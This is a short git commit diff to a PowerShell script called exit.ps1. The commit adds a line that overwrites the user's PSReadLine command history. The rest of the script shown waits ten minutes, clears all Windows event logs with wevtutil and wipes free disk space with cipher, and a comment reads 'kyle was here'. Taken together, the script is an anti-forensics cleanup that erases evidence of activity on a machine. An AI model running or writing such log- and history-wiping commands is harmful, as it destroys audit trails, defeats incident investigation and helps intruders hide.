b90cb11186c90686c44a47a2729f69509bda130f
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-12-01 09:00:55 +0000

    Update exit.ps1

--- exit.ps1
+++ exit.ps1
@@ -1,4 +1,5 @@
 Start-Sleep -Seconds 600
+Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work"
 wevtutil el | Foreach-Object {wevtutil cl "$_"}
 cipher /w:c:\
 # kyle was here
